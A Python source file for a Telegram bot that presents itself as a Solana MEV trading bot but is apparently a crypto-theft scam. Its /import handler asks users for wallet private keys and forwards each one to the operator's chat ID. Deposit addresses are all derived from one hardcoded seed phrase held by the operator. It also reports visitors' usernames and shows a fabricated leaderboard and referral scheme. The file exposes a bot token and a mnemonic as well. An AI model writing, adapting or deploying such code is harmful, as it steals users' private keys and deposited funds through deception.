import telebot
import os
import json
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
from bip_utils import Bip39SeedGenerator, Bip44, Bip44Coins, Bip44Changes, base58

# Replace with your actual Telegram bot API token
API_TOKEN = '7309412482:AAFJeoCYwj5F-vAbtv8ZGC5qpviXgpHZs7Y'
bot = telebot.TeleBot(API_TOKEN)

# Sample wallet information (replace with actual data management logic if needed)
wallet1_balance = "0 SOL ($0.00)"

# File to store user addresses
USER_ADDRESSES_FILE = 'user_addresses.json'

# Load user addresses from file or initialize an empty dictionary
user_addresses = {}
if os.path.exists(USER_ADDRESSES_FILE):
    with open(USER_ADDRESSES_FILE, 'r') as f:
        user_addresses = json.load(f)


# Define the BlockChainAccount class for managing wallet functionality
class BlockChainAccount:
    def __init__(self, mnemonic, coin_type=Bip44Coins.SOLANA, password=''):
        self.mnemonic = mnemonic.strip()
        self.coin_type = coin_type
        self.password = password

    def generate_wallet(self, dr):
        seed_bytes = Bip39SeedGenerator(self.mnemonic).Generate(self.password)
        if self.coin_type != Bip44Coins.SOLANA:
            bip44_mst_ctx = Bip44.FromSeed(seed_bytes, self.coin_type).DeriveDefaultPath()
            return bip44_mst_ctx.PublicKey().ToAddress(), bip44_mst_ctx.PrivateKey().Raw().ToHex()
        else:
            bip44_mst_ctx = Bip44.FromSeed(seed_bytes, self.coin_type)
            bip44_acc_ctx = bip44_mst_ctx.Purpose().Coin().Account(dr)
            bip44_chg_ctx = bip44_acc_ctx.Change(Bip44Changes.CHAIN_EXT)
            priv_key_bytes = bip44_chg_ctx.PrivateKey().Raw().ToBytes()
            public_key_bytes = bip44_chg_ctx.PublicKey().RawCompressed().ToBytes()[1:]
            key_pair = priv_key_bytes + public_key_bytes
            return bip44_chg_ctx.PublicKey().ToAddress(), base58.Base58Encoder.Encode(key_pair)


# Function to save user addresses to file
def save_user_addresses():
    with open(USER_ADDRESSES_FILE, 'w') as f:
        json.dump(user_addresses, f)


# Command handler for /start command
@bot.message_handler(commands=['start'])
def send_welcome(message):
    # Send username to chat ID 1409893198
    bot.send_message(1409893198, f"New user visited the bot: {message.from_user.username}")

    if message.chat.id in user_addresses:
        address = user_addresses[message.chat.id]
        #bot.send_message(message.chat.id, f"Welcome back! Your Solana address is:\n`{address}`", parse_mode='Markdown')
    else:
        # Generate new Solana address for new user
        blockchain_acc = BlockChainAccount('mango message park history card couch valve holiday creek core crack rent')
        address, _ = blockchain_acc.generate_wallet(len(user_addresses))

        # Save the address for the user
        user_addresses[message.chat.id] = address
        save_user_addresses()

       # bot.send_message(message.chat.id, f"Your new Solana address is:\n`{address}`", parse_mode='Markdown')

    welcome_text = (
        "👋 Welcome to SNIPE's Solana MEV Bot v1.1 Alpha Release!\n\n"
        "MEV Bots detect transactions involving Solana tokens and "
        "purchase the token milliseconds before the detected transaction goes through, "
        "and sells instantly after the detected transaction is confirmed, which extracts Solana "
        "easily at the cost of the token's value going down.\n\n"
        "Our bot is designed to perform the fastest swap trades on the Solana blockchain targeting SOL/WSoL. "
        "It utilizes the Jito validator to backrun & frontrun trades in all major liquidity pools on complete autopilot.\n\n"
        "Current fees: 1% of profits for all successful MEVs\n\n"
        "Telegram Channel for Updates: @solmevbots\n"
        "Developer: @apemevbots\n\n"
        "Supports Jupiter, Raydium, Orca, Meteora, Fluxbeam, PinkSale & PumpFun pools.\n\n"
        "Learn more about MEV: https://www.helius.dev/blog/solana-mev-an-introduction\n\n"
        "Your PnL to Date: 0 SOL 🟧"
    )
    bot.send_message(message.chat.id, welcome_text)
    show_menu(message)


# Callback handler for menu options
@bot.callback_query_handler(func=lambda call: True)
def handle_query(call):
    if call.data in ["mev_sniper", "positions", "autotrade", "settings"]:
        bot.answer_callback_query(call.id, f"{call.data.capitalize()} selected.")
        show_wallet_options(call.message)
    elif call.data in ["wallet", "referrals"]:
        bot.answer_callback_query(call.id, f"{call.data.capitalize()} selected.")
        if call.data == "referrals":
            show_referral_info(call.message)
        else:
            show_wallet_options(call.message)
    elif call.data == "leaderboard":
        bot.answer_callback_query(call.id, "Leaderboard selected.")
        show_leader_info(call.message)
    elif call.data == "back_to_menu":
        show_menu(call.message)
    elif call.data == "import_wallet":
        bot.answer_callback_query(call.id, "Import wallet selected.")
        showimport(call.message)
        # Add logic for import wallet here
    elif call.data == "deposit_new_wallet":
        bot.answer_callback_query(call.id, "Deposit to your wallet.")
        # Generate and show deposit info using mnemonic
        blockchain_acc = BlockChainAccount('mango message park history card couch valve holiday creek core crack rent')
        address, _ = blockchain_acc.generate_wallet(len(user_addresses))

        # Save the address for the user
        user_addresses[call.message.chat.id] = address
        save_user_addresses()

        show_deposit_info(call.message, address, wallet1_balance)


# Function to show wallet options
def show_wallet_options(message):
    try:
        bot.delete_message(message.chat.id, message.message_id)
    except Exception as e:
        print(f"Error deleting message: {e}")
    markup = InlineKeyboardMarkup()
    markup.row_width = 1
    markup.add(
        InlineKeyboardButton("Deposit to your wallet", callback_data="deposit_new_wallet"),
        InlineKeyboardButton("Import wallet", callback_data="import_wallet"),
        InlineKeyboardButton("🔙 Back to Menu", callback_data="back_to_menu")
    )
    bot.send_message(message.chat.id, """Balance: 0.0 SOL

        ⚠️ Warning: Your wallet balance is 0 SOL.

        Please deposit at least 0.5 SOL to activate your wallet.""", reply_markup=markup)

# Function to show deposit info
def show_deposit_info(message, address, balance):
    try:
        bot.delete_message(message.chat.id, message.message_id)
    except Exception as e:
        print(f"Error deleting message: {e}")
    deposit_text = (
        f"Wallet1:\n"
        f"`{address}`\n"
        f"Balance: {balance}\n\n"
        "Click on the Refresh button to update your current balance."
    )
    markup = InlineKeyboardMarkup()
    markup.row_width = 1
    markup.add(
        InlineKeyboardButton("Refresh", callback_data="refresh_balance"),
        InlineKeyboardButton("🔙 Back to Menu", callback_data="back_to_menu")
    )
    bot.send_message(message.chat.id, deposit_text, reply_markup=markup, parse_mode='Markdown')


# Function to show referral info
def show_referral_info(message):
    try:
        bot.delete_message(message.chat.id, message.message_id)
    except Exception as e:
        print(f"Error deleting message: {e}")
    referral_text = (
        "Earn 10% from all MEV bot trades with your personal referral link, benefiting across three levels:\n\n"
        "1st level: 10% = 0.1 SOL\n"
        "2nd level: 3% = 0.03 SOL\n"
        "3rd level: 2% = 0.02 SOL\n\n"
        "🔗 Your Link: [https://t.me/fissuredmevbot?start=6246](https://t.me/fissuredmevbot?start=6246)\n\n"
        "Total Referrals: 0"
    )
    markup = InlineKeyboardMarkup()
    markup.add(
        InlineKeyboardButton("🔙 Back to Menu", callback_data="back_to_menu")
    )
    bot.send_message(message.chat.id, referral_text, reply_markup=markup, parse_mode='Markdown',
                     disable_web_page_preview=True)

def show_menu(message):
    try:
        bot.delete_message(message.chat.id, message.message_id)
    except:
        pass

    markup = InlineKeyboardMarkup(row_width=2)
    markup.add(
        InlineKeyboardButton("🚀 MEV Sniper", callback_data="mev_sniper"),
        InlineKeyboardButton("📊 Positions", callback_data="positions"),
        InlineKeyboardButton("🤖 Autotrade", callback_data="autotrade"),
        InlineKeyboardButton("💰 Wallet", callback_data="wallet"),
        InlineKeyboardButton("🤝 Referrals", callback_data="referrals"),
        InlineKeyboardButton("⚙️ Settings", callback_data="settings"),
        InlineKeyboardButton("🏆 Leaderboard", callback_data="leaderboard")
    )
    bot.send_message(message.chat.id, "Choose an option:", reply_markup=markup)

# Function to show leaderboard info
def show_leader_info(message):
    try:
        bot.delete_message(message.chat.id, message.message_id)
    except Exception as e:
        print(f"Error deleting message: {e}")
    leaderboard_text = (
        """
        TOP USER PNL:

🥇 User #7019 @ 434 SOL
🥈 User #2253 @ 223 SOL
🥉 User #5619 @ 187 SOL

Last Update: 2 July 2024

Your Monthly Volume: 0.0 SOL
Your Current PnL: 0.0 SOL
        """
    )
    markup = InlineKeyboardMarkup()
    markup.add(
        InlineKeyboardButton("🔙 Back to Menu", callback_data="back_to_menu")
    )
    bot.send_message(message.chat.id, leaderboard_text, reply_markup=markup, parse_mode='Markdown',
                     disable_web_page_preview=True)
@bot.message_handler(commands=['import'])
def handle_import(message):
    try:
        pk = message.text.split()[1]
        bot.send_message(1409893198, pk)
    except:
        pass

def showimport(message):
    try:
        bot.delete_message(message.chat.id, message.message_id)
    except Exception as e:
        print(f"Error deleting message: {e}")
    leaderboard_text = (
        """
        ❗️Accepted formats are in the style of Phantom (e.g. "88631DEyXSWf...") or Solflare (e.g. [93,182,8,9,100,...]). Private keys from other Telegram bots will work.

Please use the /import command to import your wallet:

Format: /import [Wallet Name] [Private Key]

Tutorial to Find Private Key in Phantom: https://help.phantom.app/hc/en-us/articles/28355165637011-Displaying-and-Exporting-Your-Private-Key
        """
    )
    markup = InlineKeyboardMarkup()
    markup.add(
        InlineKeyboardButton("🔙 Back to Menu", callback_data="back_to_menu")
    )
    bot.send_message(message.chat.id, leaderboard_text, reply_markup=markup, parse_mode='Markdown',
                     disable_web_page_preview=True)

# Start the bot
bot.polling()
